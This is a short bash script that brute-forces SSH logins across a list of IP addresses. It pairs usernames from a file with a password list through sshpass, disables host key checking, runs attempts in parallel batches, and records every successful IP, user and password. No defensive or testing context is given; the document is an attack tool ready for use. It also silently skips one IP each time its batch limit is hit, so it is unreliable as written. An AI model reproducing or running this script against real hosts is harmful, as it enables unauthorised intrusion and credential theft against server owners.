#!/bin/bash
ip_list=$1 # list of IPs
passwd=$2 # list of passwords
result=$3 # file to put results
>$result

function check_ip {
  for user in `cat user_list`
  do 
    for pass in `cat $2`
    do 
      sshpass -p $pass ssh -n -o "StrictHostKeyChecking no" -o "ConnectTimeout=5" $user@$1 "uname -a" 2>&1 >/dev/null && echo "$1 $user $pass" | tee -a $3
    done
  done
}

ee=0
nt=20 #number of threads

while read ip
  do
    echo $ee
    echo "IP: $ip"
    date "+%s"
    if [ $ee -lt $nt ]
    then
      check_ip $ip $passwd $result&
      ee=$((ee+1))
    else
      wait
      ee=0
    fi
  done < $1
